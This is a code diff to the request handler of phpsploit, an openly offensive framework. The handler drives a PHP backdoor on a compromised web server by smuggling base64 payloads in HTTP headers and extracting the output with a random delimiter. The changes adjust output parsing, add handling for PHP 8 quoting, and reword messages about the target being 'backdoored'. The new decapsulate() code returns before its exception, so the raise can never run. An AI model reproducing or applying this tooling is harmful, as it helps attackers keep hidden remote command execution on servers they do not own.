@@ -74,6 +74,10 @@ def _load_template(filepath):
     return file.phpcode()
 
 
+class NoPayloadInResponse(Exception):
+    pass
+
+
 class Request:
     """Phpsploit HTTP Request Handler
     """
@@ -83,10 +87,6 @@ class Request:
     # pre-set headers, which might be considered to count vacant headers
     base_headers = ['host', 'accept-encoding', 'connection', 'user-agent']
     post_headers = ['content-type', 'content-length']
-
-    # the parser format string, used to parse/unparse phpsploit data
-    parser = '<%SEP%>%s</%SEP%>'
-
 
     # specific php code templates which are injected in the main evil
     # header, nominated by the PASSKEY setting, in charge of asessing
@@ -127,10 +127,8 @@ class Request:
         # the list of user specified additionnal headers (HTTP_* settings)
         self.set_headers = self.load_headers(session.Conf)
 
-        # the parser/unparser are used to truncate phpsploit
-        # data from the received http response.
-        self.parser = self.parser.replace('%SEP%', str(uuid.uuid4()))
-        self.unparser = re.compile((self.parser % '(.+?)').encode(), re.S)
+        # random delimiter user to extract phpsploit output
+        self.delim = str(uuid.uuid4())
 
         # try to get a tmpdir, which acts as recipient directory on payloads
         # sent via multiple requests, if no writeable tmpdir is known, the
@@ -203,20 +201,21 @@ class Request:
         return True
 
     def encapsulate(self, php_payload):
-        """wrap unencoded payload within self.parser
+        """wrap unencoded payload within self.delim
         """
         php_payload = php_payload.rstrip(';')
-        header, footer = [('echo "%s";' % x) for x in self.parser.split('%s')]
-        return header + php_payload + footer
+        echo_delim = 'echo "%s";' % self.delim
+        return echo_delim + php_payload + echo_delim
 
     def decapsulate(self, response):
         """extract payload response from http response body
         """
         response = response.read()
-        match = re.findall(self.unparser, response)
-        if match:
-            return match[0]
-        return response
+        chunks = response.split(self.delim.encode(), 2)
+        if len(chunks) == 3:
+            return chunks[1]
+        return None
+        raise NoPayloadInResponse(response)
 
     def load_multipart(self):
         """enable the multi-request payload capability.
@@ -287,19 +286,32 @@ class Request:
             # create a visible sample of the effective b64 payload
             len_third = float(len(forwarder) / 3)
             len_third = int(round(len_third + 0.5))
-            sample_sep = colorize("%Reset", "\n[*]", "%Cyan")
+            sample_sep = colorize("%Reset", "\n[*] ", "%Cyan")
             lines = [''] + self.split_len(forwarder, len_third)
             err = ("[*] do not enquotes the base64 payload which"
                    " contains non alpha numeric chars (+ or /),"
                    " blocking execution:" + sample_sep.join(lines))
+
+        # if server is running PHP >=8, non-quoted literal won't be
+        # interpreted as a string, leading to impossibility to
+        # execute phpsploit unless quotes are added to the payload:
+        elif "'%s'" not in hdr_payload and \
+                '"%s"' not in hdr_payload:
+            len_third = float(len(forwarder) / 3)
+            len_third = int(round(len_third + 0.5))
+            sample_sep = colorize("%Reset", "\n[*] ", "%Cyan")
+            lines = [''] + self.split_len(forwarder, len_third)
+            err = ("[*] doesn't quotes base64 payload, and if"
+                   " target runs on PHP>=8, execution will fail"
+                   " (GH Issue #168):" + sample_sep.join(lines))
 
         # if current request is not affected by previous case,
         # request may still fail because the header containing the
         # payload stager has quotes.
         elif '"' in hdr_payload or \
              "'" in hdr_payload:
-            err = ("[*] contains quotes, and some http servers "
-                   "defaultly act escaping them in request headers.")
+            err = ("[*] contains quotes, and some http servers & firewalls"
+                   "escape them in request headers.")
 
         self.payload_forwarder_error = err
         return {self.passkey: forwarder}
@@ -516,6 +528,8 @@ class Request:
 
         # treat errors if request failed
         except urllib.error.HTTPError as e:
+            # import pprint
+            # pprint.pprint(e)
             try:
                 response['data'] = self.decapsulate(e)
             except:
@@ -599,7 +613,13 @@ class Request:
         request = self.Build(php_payload)
 
         response = self.Send(request)
+        # import pprint
+        # pprint.pprint(response)
         if display_warnings(response):
+            if self.payload_forwarder_error:
+                print("[*] If you are sure that the target is properly "
+                      "backdoored, this may occur because "
+                      "REQ_HEADER_PAYLOAD\n" + self.payload_forwarder_error)
             raise RequestError(self.errmsg_request)
 
         readed = self.Read(response)
@@ -623,7 +643,7 @@ class Request:
                              'than REQ_MAX_HEADER_SIZE')
 
         # format the current php payload whith the dedicated Build() method.
-        php_payload = payload.Build(php_payload, self.parser)
+        php_payload = payload.Build(php_payload, self.delim)
 
         # get a dict of available modes by method
         mode = {}
@@ -815,8 +835,8 @@ class Request:
                   " (maybe invalid PASSKEY ?)")
             # print payload forwarder error (if any)
             if self.payload_forwarder_error:
-                print("[*] If you are sure that the target is anyway "
-                      "infected, this error may occur because the "
+                print("[*] If you are sure that the target is properly "
+                      "backdoored, this may occur because "
                       "REQ_HEADER_PAYLOAD\n" + self.payload_forwarder_error)
             return ''
 
@@ -833,11 +853,11 @@ class Request:
         # convert the response data into python variable
         try:
             response = payload.php2py(b_response)
-        except:
+        except Exception as e:
             php_errors = self.get_php_errors(response['data'])
             if php_errors:
                 return php_errors
-            raise
+            raise e
 
         # import pprint
         # pprint.pprint("------------- PYTHON RESPONSE DICT -------------")
